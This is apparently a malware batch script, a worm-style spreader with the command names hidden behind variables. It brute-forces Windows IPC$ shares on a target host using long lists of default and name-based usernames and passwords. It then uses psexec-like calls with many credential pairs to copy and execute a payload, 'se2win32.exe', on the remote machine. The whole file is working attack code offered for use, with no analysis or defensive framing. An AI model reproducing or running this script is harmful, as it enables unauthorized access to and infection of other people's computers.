%Q%%W%%E% use \\%1\ipc$ "changeme" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "admin" /user:admin
%Q%%W%%E% use \\%1\ipc$ "root" /user:root
%Q%%W%%E% use \\%1\ipc$ "webmaster" /user:webmaster
%Q%%W%%E% use \\%1\ipc$ "data" /user:data
%Q%%W%%E% use \\%1\ipc$ "user" /user:user
%Q%%W%%E% use \\%1\ipc$ "web" /user:web
%Q%%W%%E% use \\%1\ipc$ "oracle" /user:oracle
%Q%%W%%E% use \\%1\ipc$ "sybase" /user:sybase
%Q%%W%%E% use \\%1\ipc$ "test" /user:test
%Q%%W%%E% use \\%1\ipc$ "master" /user:master
%Q%%W%%E% use \\%1\ipc$ "account" /user:account
%Q%%W%%E% use \\%1\ipc$ "access" /user:access
%Q%%W%%E% use \\%1\ipc$ "System4" /user:System4
%Q%%W%%E% use \\%1\ipc$ "ownage" /user:ownage
%Q%%W%%E% use \\%1\ipc$ "backup" /user:backup
%Q%%W%%E% use \\%1\ipc$ "server" /user:server
%Q%%W%%E% use \\%1\ipc$ "wang" /user:wang
%Q%%W%%E% use \\%1\ipc$ "zhang" /user:zhang
%Q%%W%%E% use \\%1\ipc$ "liu" /user:liu
%Q%%W%%E% use \\%1\ipc$ "chen" /user:chen
%Q%%W%%E% use \\%1\ipc$ "yang" /user:yang
%Q%%W%%E% use \\%1\ipc$ "zhao" /user:zhao
%Q%%W%%E% use \\%1\ipc$ "huang" /user:huang
%Q%%W%%E% use \\%1\ipc$ "zhou" /user:zhou
%Q%%W%%E% use \\%1\ipc$ "sun" /user:sun
%Q%%W%%E% use \\%1\ipc$ "zhu" /user:zhu
%Q%%W%%E% use \\%1\ipc$ "gao" /user:gao
%Q%%W%%E% use \\%1\ipc$ "lin" /user:lin
%Q%%W%%E% use \\%1\ipc$ "guo" /user:guo
%Q%%W%%E% use \\%1\ipc$ "luo" /user:luo
%Q%%W%%E% use \\%1\ipc$ "liang" /user:liang
%Q%%W%%E% use \\%1\ipc$ "song" /user:song
%Q%%W%%E% use \\%1\ipc$ "zheng" /user:zheng
%Q%%W%%E% use \\%1\ipc$ "xie" /user:xie
%Q%%W%%E% use \\%1\ipc$ "han" /user:han
%Q%%W%%E% use \\%1\ipc$ "tang" /user:tang
%Q%%W%%E% use \\%1\ipc$ "feng" /user:feng
%Q%%W%%E% use \\%1\ipc$ "dong" /user:dong
%Q%%W%%E% use \\%1\ipc$ "xiao" /user:xiao
%Q%%W%%E% use \\%1\ipc$ "cheng" /user:cheng
%Q%%W%%E% use \\%1\ipc$ "cao" /user:cao
%Q%%W%%E% use \\%1\ipc$ "yuan" /user:yuan
%Q%%W%%E% use \\%1\ipc$ "deng" /user:deng
%Q%%W%%E% use \\%1\ipc$ "shen" /user:shen
%Q%%W%%E% use \\%1\ipc$ "jiang" /user:jiang
%Q%%W%%E% use \\%1\ipc$ "zeng" /user:zeng
%Q%%W%%E% use \\%1\ipc$ "peng" /user:peng
%Q%%W%%E% use \\%1\ipc$ "cai" /user:cai
%Q%%W%%E% use \\%1\ipc$ "jia" /user:jia
%Q%%W%%E% use \\%1\ipc$ "ding" /user:ding
%Q%%W%%E% use \\%1\ipc$ "wei" /user:wei
%Q%%W%%E% use \\%1\ipc$ "xue" /user:xue
%Q%%W%%E% use \\%1\ipc$ "pan" /user:pan
%Q%%W%%E% use \\%1\ipc$ "dai" /user:dai
%Q%%W%%E% use \\%1\ipc$ "xia" /user:xia
%Q%%W%%E% use \\%1\ipc$ "zhong" /user:zhong
%Q%%W%%E% use \\%1\ipc$ "wang" /user:wang
%Q%%W%%E% use \\%1\ipc$ "tian" /user:tian
%Q%%W%%E% use \\%1\ipc$ "ren" /user:ren
%Q%%W%%E% use \\%1\ipc$ "fan" /user:fan
%Q%%W%%E% use \\%1\ipc$ "fang" /user:fang
%Q%%W%%E% use \\%1\ipc$ "shi" /user:shi
%Q%%W%%E% use \\%1\ipc$ "yao" /user:yao
%Q%%W%%E% use \\%1\ipc$ "tan" /user:tan
%Q%%W%%E% use \\%1\ipc$ "liao" /user:liao
%Q%%W%%E% use \\%1\ipc$ "zou" /user:zou
%Q%%W%%E% use \\%1\ipc$ "xiong" /user:xiong
%Q%%W%%E% use \\%1\ipc$ "jin" /user:jin

%Q%%W%%E% use \\%1\ipc$ "hao" /user:hao
%Q%%W%%E% use \\%1\ipc$ "kong" /user:kong
%Q%%W%%E% use \\%1\ipc$ "bai" /user:bai
%Q%%W%%E% use \\%1\ipc$ "cui" /user:cui
%Q%%W%%E% use \\%1\ipc$ "kang" /user:kang
%Q%%W%%E% use \\%1\ipc$ "mao" /user:mao
%Q%%W%%E% use \\%1\ipc$ "qiu" /user:qiu
%Q%%W%%E% use \\%1\ipc$ "qing" /user:qing
%Q%%W%%E% use \\%1\ipc$ "shi" /user:shi
%Q%%W%%E% use \\%1\ipc$ "hou" /user:hou
%Q%%W%%E% use \\%1\ipc$ "shao" /user:shao
%Q%%W%%E% use \\%1\ipc$ "long" /user:long
%Q%%W%%E% use \\%1\ipc$ "wan" /user:wan
%Q%%W%%E% use \\%1\ipc$ "duan" /user:duan
%Q%%W%%E% use \\%1\ipc$ "lei" /user:lei
%Q%%W%%E% use \\%1\ipc$ "qian" /user:qian
%Q%%W%%E% use \\%1\ipc$ "tang" /user:tang
%Q%%W%%E% use \\%1\ipc$ "yin" /user:yin
%Q%%W%%E% use \\%1\ipc$ "chang" /user:chang
%Q%%W%%E% use \\%1\ipc$ "qiao" /user:qiao
%Q%%W%%E% use \\%1\ipc$ "lai" /user:lai
%Q%%W%%E% use \\%1\ipc$ "gong" /user:gong
%Q%%W%%E% use \\%1\ipc$ "weng" /user:weng
%Q%%W%%E% use \\%1\ipc$ "ouyang" /user:ouyang
%Q%%W%%E% use \\%1\ipc$ "dugu" /user:dugu
%Q%%W%%E% use \\%1\ipc$ "dongfang" /user:dongfang
%Q%%W%%E% use \\%1\ipc$ "andy" /user:andy
%Q%%W%%E% use \\%1\ipc$ "bob" /user:bob
%Q%%W%%E% use \\%1\ipc$ "david" /user:david
%Q%%W%%E% use \\%1\ipc$ "david" /user:Rasmussen
%Q%%W%%E% use \\%1\ipc$ "tom" /user:tom
%Q%%W%%E% use \\%1\ipc$ "lee" /user:lee
%Q%%W%%E% use \\%1\ipc$ "alan" /user:alan
%Q%%W%%E% use \\%1\ipc$ "frank" /user:frank
%Q%%W%%E% use \\%1\ipc$ "george" /user:george
%Q%%W%%E% use \\%1\ipc$ "henry" /user:henry
%Q%%W%%E% use \\%1\ipc$ "john" /user:john
%Q%%W%%E% use \\%1\ipc$ "charles" /user:charles
%Q%%W%%E% use \\%1\ipc$ "king" /user:king
%Q%%W%%E% use \\%1\ipc$ "lewis" /user:lewis
%Q%%W%%E% use \\%1\ipc$ "louis" /user:louis
%Q%%W%%E% use \\%1\ipc$ "mark" /user:mark
%Q%%W%%E% use \\%1\ipc$ "michael" /user:michael
%Q%%W%%E% use \\%1\ipc$ "paul" /user:paul
%Q%%W%%E% use \\%1\ipc$ "peter" /user:peter
%Q%%W%%E% use \\%1\ipc$ "catty" /user:catty
%Q%%W%%E% use \\%1\ipc$ "richard" /user:richard
%Q%%W%%E% use \\%1\ipc$ "steve" /user:steve
%Q%%W%%E% use \\%1\ipc$ "helen" /user:helen
%Q%%W%%E% use \\%1\ipc$ "robert" /user:robert
%Q%%W%%E% use \\%1\ipc$ "jack" /user:jack
%Q%%W%%E% use \\%1\ipc$ "sam" /user:sam
%Q%%W%%E% use \\%1\ipc$ "jenny" /user:jenny
%Q%%W%%E% use \\%1\ipc$ "james" /user:james
%Q%%W%%E% use \\%1\ipc$ "jim" /user:jim
%Q%%W%%E% use \\%1\ipc$ "mike" /user:mike
%Q%%W%%E% use \\%1\ipc$ "thomas" /user:thomas
%Q%%W%%E% use \\%1\ipc$ "jimmy" /user:jimmy
%Q%%W%%E% use \\%1\ipc$ "daniel" /user:daniel
%Q%%W%%E% use \\%1\ipc$ "" /user:dan
%Q%%W%%E% use \\%1\ipc$ "kevin" /user:kevin
%Q%%W%%E% use \\%1\ipc$ "marvin" /user:marvin
%Q%%W%%E% use \\%1\ipc$ "matin" /user:matin
%Q%%W%%E% use \\%1\ipc$ "tony" /user:tony
%Q%%W%%E% use \\%1\ipc$ "albert" /user:albert
%Q%%W%%E% use \\%1\ipc$ "andrew" /user:andrew
%Q%%W%%E% use \\%1\ipc$ "marco" /user:marco
%Q%%W%%E% use \\%1\ipc$ "simon" /user:simon
%Q%%W%%E% use \\%1\ipc$ "catherine" /user:catherine
%Q%%W%%E% use \\%1\ipc$ "douglas" /user:douglas
%Q%%W%%E% use \\%1\ipc$ "edward" /user:edward
%Q%%W%%E% use \\%1\ipc$ "julia" /user:julia
%Q%%W%%E% use \\%1\ipc$ "vivian" /user:vivian
%Q%%W%%E% use \\%1\ipc$ "tommy" /user:tommy
%Q%%W%%E% use \\%1\ipc$ "elizabeth" /user:elizabeth
%Q%%W%%E% use \\%1\ipc$ "philip" /user:philip
%Q%%W%%E% use \\%1\ipc$ "alex" /user:alex
%Q%%W%%E% use \\%1\ipc$ "william" /user:william
%Q%%W%%E% use \\%1\ipc$ "lily" /user:lily
%Q%%W%%E% use \\%1\ipc$ "anderson" /user:anderson
%Q%%W%%E% use \\%1\ipc$ "arnold" /user:arnold
%Q%%W%%E% use \\%1\ipc$ "patrick" /user:patrick
%Q%%W%%E% use \\%1\ipc$ "susan" /user:susan
%Q%%W%%E% use \\%1\ipc$ "christoph" /user:christoph
%Q%%W%%E% use \\%1\ipc$ "clark" /user:clark
%Q%%W%%E% use \\%1\ipc$ "donald" /user:donald
%Q%%W%%E% use \\%1\ipc$ "joe" /user:joe
%Q%%W%%E% use \\%1\ipc$ "jerry" /user:jerry
%Q%%W%%E% use \\%1\ipc$ "eric" /user:eric
%Q%%W%%E% use \\%1\ipc$ "franklin" /user:franklin
%Q%%W%%E% use \\%1\ipc$ "billy" /user:billy
%Q%%W%%E% use \\%1\ipc$ "harrison" /user:harrison
%Q%%W%%E% use \\%1\ipc$ "herbert" /user:herbert

%Q%%W%%E% use \\%1\ipc$ "calvin" /user:calvin
%Q%%W%%E% use \\%1\ipc$ "howard" /user:howard
%Q%%W%%E% use \\%1\ipc$ "jackson" /user:jackson
%Q%%W%%E% use \\%1\ipc$ "joseph" /user:joseph
%Q%%W%%E% use \\%1\ipc$ "adam" /user:adam
%Q%%W%%E% use \\%1\ipc$ "laurence" /user:laurence
%Q%%W%%E% use \\%1\ipc$ "parker" /user:parker
%Q%%W%%E% use \\%1\ipc$ "ronald" /user:ronald
%Q%%W%%E% use \\%1\ipc$ "alexander" /user:alexander
%Q%%W%%E% use \\%1\ipc$ "alvin" /user:alvin
%Q%%W%%E% use \\%1\ipc$ "abraham" /user:abraham
%Q%%W%%E% use \\%1\ipc$ "mary" /user:mary
%Q%%W%%E% use \\%1\ipc$ "august" /user:august
%Q%%W%%E% use \\%1\ipc$ "benjamin" /user:benjamin
%Q%%W%%E% use \\%1\ipc$ "danny" /user:danny
%Q%%W%%E% use \\%1\ipc$ "angel" /user:angel
%Q%%W%%E% use \\%1\ipc$ "maggie" /user:maggie
%Q%%W%%E% use \\%1\ipc$ "francis" /user:francis
%Q%%W%%E% use \\%1\ipc$ "denver" /user:denver
%Q%%W%%E% use \\%1\ipc$ "gerald" /user:gerald
%Q%%W%%E% use \\%1\ipc$ "harold" /user:harold
%Q%%W%%E% use \\%1\ipc$ "jacob" /user:jacob
%Q%%W%%E% use \\%1\ipc$ "jeffery" /user:jeffery
%Q%%W%%E% use \\%1\ipc$ "jordan" /user:jordan
%Q%%W%%E% use \\%1\ipc$ "joy" /user:joy
%Q%%W%%E% use \\%1\ipc$ "joan" /user:joan
%Q%%W%%E% use \\%1\ipc$ "kenny" /user:kenny
%Q%%W%%E% use \\%1\ipc$ "nelson" /user:nelson
%Q%%W%%E% use \\%1\ipc$ "oliver" /user:oliver
%Q%%W%%E% use \\%1\ipc$ "robin" /user:robin
%Q%%W%%E% use \\%1\ipc$ "samuel" /user:samuel
%Q%%W%%E% use \\%1\ipc$ "wilson" /user:wilson
%Q%%W%%E% use \\%1\ipc$ "ana" /user:ana
%Q%%W%%E% use \\%1\ipc$ "alice" /user:alice
%Q%%W%%E% use \\%1\ipc$ "carol" /user:carol
%Q%%W%%E% use \\%1\ipc$ "cindy" /user:cindy
%Q%%W%%E% use \\%1\ipc$ "gloria" /user:gloria
%Q%%W%%E% use \\%1\ipc$ "diana" /user:diana
%Q%%W%%E% use \\%1\ipc$ "rebecca" /user:rebecca
%Q%%W%%E% use \\%1\ipc$ "johana" /user:johana
%Q%%W%%E% use \\%1\ipc$ "julie" /user:julie
%Q%%W%%E% use \\%1\ipc$ "linda" /user:linda
%Q%%W%%E% use \\%1\ipc$ "nancy" /user:nancy
%Q%%W%%E% use \\%1\ipc$ "rose" /user:rose
%Q%%W%%E% use \\%1\ipc$ "angela" /user:angela
%Q%%W%%E% use \\%1\ipc$ "grace" /user:grace
%Q%%W%%E% use \\%1\ipc$ "helena" /user:helena
%Q%%W%%E% use \\%1\ipc$ "jane" /user:jane
%Q%%W%%E% use \\%1\ipc$ "janet" /user:janet
%Q%%W%%E% use \\%1\ipc$ "joyce" /user:joyce
%Q%%W%%E% use \\%1\ipc$ "lisa" /user:lisa
%Q%%W%%E% use \\%1\ipc$ "maria" /user:maria
%Q%%W%%E% use \\%1\ipc$ "sandy" /user:sandy
%Q%%W%%E% use \\%1\ipc$ "susanna" /user:susanna
%Q%%W%%E% use \\%1\ipc$ "victoria" /user:victoria
%Q%%W%%E% use \\%1\ipc$ "whitney" /user:whitney
%Q%%W%%E% use \\%1\ipc$ "ada" /user:ada
%Q%%W%%E% use \\%1\ipc$ "amanda" /user:amanda
%Q%%W%%E% use \\%1\ipc$ "caroline" /user:caroline
%Q%%W%%E% use \\%1\ipc$ "connie" /user:connie
%Q%%W%%E% use \\%1\ipc$ "cynthia" /user:cynthia
%Q%%W%%E% use \\%1\ipc$ "emilly" /user:emilly
%Q%%W%%E% use \\%1\ipc$ "jessica" /user:jessica
%Q%%W%%E% use \\%1\ipc$ "laura" /user:laura
%Q%%W%%E% use \\%1\ipc$ "olivia" /user:olivia
%Q%%W%%E% use \\%1\ipc$ "" /user:administrator
%Q%%W%%E% use \\%1\ipc$ "" /user:administrateur
%Q%%W%%E% use \\%1\ipc$ "" /user:wwwadmin
%Q%%W%%E% use \\%1\ipc$ "" /user:database
%Q%%W%%E% use \\%1\ipc$ "" /user:user
%Q%%W%%E% use \\%1\ipc$ "" /user:test
%R%%T%%T%%E \\%1 -s -c -f -d se2win32.exe
:Extension
%P%%Q%%Q%%C% \\%1 -u Extension -p "" -s -c -f -d se2win32.exe
goto end
:Administrateurpenis
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "12345" -s -c -f -d se2win32.exe
goto end
:Administrateurpenis2
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "123456" -s -c -f -d se2win32.exe
goto end
:meruser
%P%%Q%%Q%%C% \\%1 -u MERUSER -p "" -s -c -f -d se2win32.exe
goto end
:userblank
%P%%Q%%Q%%C% \\%1 -u user -p "" -s -c -f -d se2win32.exe
goto end
:defdef
%P%%Q%%Q%%C% \\%1 -u default -p "default" -s -c -f -d se2win32.exe
goto end
:defpass
%P%%Q%%Q%%C% \\%1 -u user -p "default" -s -c -f -d se2win32.exe
goto end
:userdef
%P%%Q%%Q%%C% \\%1 -u default -p "user" -s -c -f -d se2win32.exe
goto end
:useruser
%P%%Q%%Q%%C% \\%1 -u user -p "user" -s -c -f -d se2win32.exe
goto end
:administrator12345

%P%%Q%%Q%%C% \\%1 -u administrator -p "12345" -s -c -f -d se2win32.exe
goto end
:administratorpassword
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -s -c -f -d se2win32.exe
goto end
:administrator1234
%P%%Q%%Q%%C% \\%1 -u administrator -p "1234" -s -c -f -d se2win32.exe
goto end
:administrator123
%P%%Q%%Q%%C% \\%1 -u administrator -p "123" -s -c -f -d se2win32.exe
goto end
:administrator123456
%P%%Q%%Q%%C% \\%1 -u administrator -p "123456" -s -c -f -d se2win32.exe
goto end
:adminadministrator
%P%%Q%%Q%%C% \\%1 -u admin -p "administrator" -s -c -f -d se2win32.exe
goto end
:adminblank
%P%%Q%%Q%%C% \\%1 -u admin -p "" -s -c -f -d se2win32.exe
goto end
:sa
%P%%Q%%Q%%C% \\%1 -u sa -p "" -s -c -f -d se2win32.exe
goto end
:guestguest
%P%%Q%%Q%%C% \\%1 -u guest -p "guest" -s -c -f -d se2win32.exe
goto end
:Administrateur
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "" -s -c -f -d se2win32.exe
goto end
:Administrateurx2
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "Administrateur" -s -c -f -d se2win32.exe
goto end
:student
%P%%Q%%Q%%C% \\%1 -u student -p "student" -s -c -f -d se2win32.exe
goto end
:Invité
%P%%Q%%Q%%C% \\%1 -u Invité -p "" -s -c -f -d se2win32.exe
goto end
:amministratore
%P%%Q%%Q%%C% \\%1 -u amministratore -p "" -s -c -f -d se2win32.exe
goto end
:uzivatel
%P%%Q%%Q%%C% \\%1 -u uzivatel -p "" -s -c -f -d se2win32.exe
goto end
:blkad
%P%%Q%%Q%%C% \\%1 -u administrator -p "" -s -c -f -d se2win32.exe
goto end
:adad
%P%%Q%%Q%%C% \\%1 -u administrator -p "admin" -s -c -f -d se2win32.exe
goto end
:adadmin
%P%%Q%%Q%%C% \\%1 -u administrator -p "administrator" -s -c -f -d se2win32.exe
goto end
:rootroot
%P%%Q%%Q%%C% \\%1 -u root -p "root" -s -c -f -d se2win32.exe
goto end
:adminad
%P%%Q%%Q%%C% \\%1 -u admin -p "admin" -s -c -f -d se2win32.exe
goto end
:adtest
%P%%Q%%Q%%C% \\%1 -u administrator -p "test" -s -c -f -d se2win32.exe
goto end
:forsterkning
%P%%Q%%Q%%C% \\%1 -u forsterkning -p "" -s -c -f -d se2win32.exe
goto end
:testt
%P%%Q%%Q%%C% \\%1 -u test -p "test" -s -c -f -d se2win32.exe
goto end
:adtestt
%P%%Q%%Q%%C% \\%1 -u administrator -p "test123" -s -c -f -d se2win32.exe
goto end
:adtemp
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp" -s -c -f -d se2win32.exe
goto end
:adtempp
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp123" -s -c -f -d se2win32.exe
goto end
:adpass
%P%%Q%%Q%%C% \\%1 -u administrator -p "pass" -s -c -f -d se2win32.exe
goto end
:adpassw
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -s -c -f -d se2win32.exe
goto end
:adminch
%P%%Q%%Q%%C% \\%1 -u administrator -p "changeme" -s -c -f -d se2win32.exe
goto end
:Verwalter
%P%%Q%%Q%%C% \\%1 -u Verwalter -p "" -s -c -f -d se2win32.exe
goto end
:spanishadmin
%P%%Q%%Q%%C% \\%1 -u administrador -p "" -s -c -f -d se2win32.exe
goto end
:spanishadmin2
%P%%Q%%Q%%C% \\%1 -u administrador -p "administrador" -s -c -f -d se2win32.exe
:Extension2
%P%%Q%%Q%%C% \\%1 -u Extension -p "" -s -c -f -d se2win32.exe
goto end
:meruser2
%P%%Q%%Q%%C% \\%1 -u MERUSER -p "" -s -c -f -d se2win32.exe
goto end
:userblank2
%P%%Q%%Q%%C% \\%1 -u user -p "" -s -c -f -d se2win32.exe
goto end
:defdef2
%P%%Q%%Q%%C% \\%1 -u default -p "default" -s -c -f -d se2win32.exe
goto end
:defpass2
%P%%Q%%Q%%C% \\%1 -u user -p "default" -s -c -f -d se2win32.exe
goto end
:userdef2
%P%%Q%%Q%%C% \\%1 -u default -p "user" -s -c -f -d se2win32.exe
goto end
:useruser2
%P%%Q%%Q%%C% \\%1 -u user -p "user" -s -c -f -d se2win32.exe
goto end
:administrator123452
%P%%Q%%Q%%C% \\%1 -u administrator -p "12345" -s -c -f -d se2win32.exe
goto end
:administratorpassword2
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -s -c -f -d se2win32.exe
goto end
:administrator12342
%P%%Q%%Q%%C% \\%1 -u administrator -p "1234" -s -c -f -d se2win32.exe
goto end
:administrator1232
%P%%Q%%Q%%C% \\%1 -u administrator -p "123" -c -f -d se2win32.exe
goto end
:administrator1234562
%P%%Q%%Q%%C% \\%1 -u administrator -p "123456" -s -c -f -d se2win32.exe
goto end
:adminadministrator2
%P%%Q%%Q%%C% \\%1 -u admin -p "administrator" -s -c -f -d se2win32.exe
goto end
:adminblank2
%P%%Q%%Q%%C% \\%1 -u admin -p "" -s -c -f -d se2win32.exe
goto end
:sa2

%P%%Q%%Q%%C% \\%1 -u sa -p "" -s -c -f -d se2win32.exe
goto end
:guestguest2
%P%%Q%%Q%%C% \\%1 -u guest -p "guest" -s -c -f -d se2win32.exe
goto end
:Administrateur2
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "" -s -c -f -d se2win32.exe
goto end
:Administrateurx22
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "Administrateur" -s -c -f -d se2win32.exe
goto end
:student2
%P%%Q%%Q%%C% \\%1 -u student -p "student" -s -c -f -d se2win32.exe
goto end
:Invité2
%P%%Q%%Q%%C% \\%1 -u Invité -p "" -s -c -f -d se2win32.exe
goto end
:amministratore2
%P%%Q%%Q%%C% \\%1 -u amministratore -p "" -s -c -f -d se2win32.exe
goto end
:uzivatel2
%P%%Q%%Q%%C% \\%1 -u uzivatel -p "" -s -c -f -d se2win32.exe
goto end
:blkad2
%P%%Q%%Q%%C% \\%1 -u administrator -p "" -s -c -f -d se2win32.exe
goto end
:adad2
%P%%Q%%Q%%C% \\%1 -u administrator -p "admin" -s -c -f -d se2win32.exe
goto end
:adadmin2
%P%%Q%%Q%%C% \\%1 -u administrator -p "administrator" -s -c -f -d se2win32.exe
goto end
:rootroot2
%P%%Q%%Q%%C% \\%1 -u root -p "root" -s -c -f -d se2win32.exe
goto end
:adminad2
%P%%Q%%Q%%C% \\%1 -u admin -p "admin" -s -c -f -d se2win32.exe
goto end
:adtest2
%P%%Q%%Q%%C% \\%1 -u administrator -p "test" -s -c -f -d se2win32.exe
goto end
:forsterkning2
%P%%Q%%Q%%C% \\%1 -u forsterkning -p "" -s -c -f -d se2win32.exe
goto end
:testt2
%P%%Q%%Q%%C% \\%1 -u test -p "test" -s -c -f -d se2win32.exe
goto end
:adtestt2
%P%%Q%%Q%%C% \\%1 -u administrator -p "test123" -s -c -f -d se2win32.exe
goto end
:adtemp2
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp" -s -c -f -d se2win32.exe
goto end
:adtempp2
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp123" -s -c -f -d se2win32.exe
goto end
:adpass2
%P%%Q%%Q%%C% \\%1 -u administrator -p "pass" -s -c -f -d se2win32.exe
goto end
:adpassw2
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -s -c -f -d se2win32.exe
goto end
:adminch2
%P%%Q%%Q%%C% \\%1 -u administrator -p "changeme" -s -c -f -d se2win32.exe
goto end
:Verwalter2
%P%%Q%%Q%%C% \\%1 -u Verwalter -p "" -s -c -f -d se2win32.exe
goto end
:spanishadmin2
%P%%Q%%Q%%C% \\%1 -u administrador -p "" -s -c -f -d se2win32.exe
goto end
:spanishadmin22
%P%%Q%%Q%%C% \\%1 -u administrador -p "administrador" -s -c -f -d se2win32.exe
:end
exit
